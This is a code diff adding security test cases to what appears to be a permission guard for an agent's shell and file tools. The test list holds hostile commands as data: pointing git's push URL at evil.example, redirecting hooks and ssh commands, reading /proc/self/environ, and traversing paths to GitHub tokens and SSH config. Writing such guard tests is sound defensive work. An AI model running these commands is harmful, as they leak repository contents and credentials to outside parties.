@@ -144,6 +144,23 @@ def main() -> int:
         ]
         for command in round2:
             assert bash(command, cwd, "branch"), command
+        # Security review: config/alias redirection, /proc env, relative paths into secret dirs.
+        security = [
+            "git config remote.origin.pushurl https://evil.example/x.git",
+            "git config core.hooksPath ../hooks",
+            "git -c alias.p=push p origin HEAD",
+            "git -c core.sshCommand=x fetch",
+            "git p origin HEAD",
+            "git pull origin main",
+            "cat /proc/self/environ",
+            "cat " + "../" * 30 + "home/someone/.config/gh/hosts.yml",
+            "cat " + str(Path.home() / ".ssh" / "config"),
+        ]
+        for command in security:
+            assert bash(command, cwd, "branch"), command
+        assert tool("Read", cwd, file_path=str(Path.home() / ".config" / "gh" / "hosts.yml"))
+        for command in ("git config --get user.name", "git config --list", "git stash", "git log -1", "git rebase -i origin/main"):
+            assert bash(command, cwd, "branch") is None, command
         assert bash("git push --force-with-lease=refs/heads/main:abc origin main", cwd, "release")
         assert bash("git push -uf origin main", cwd, "release")
         quiet = [
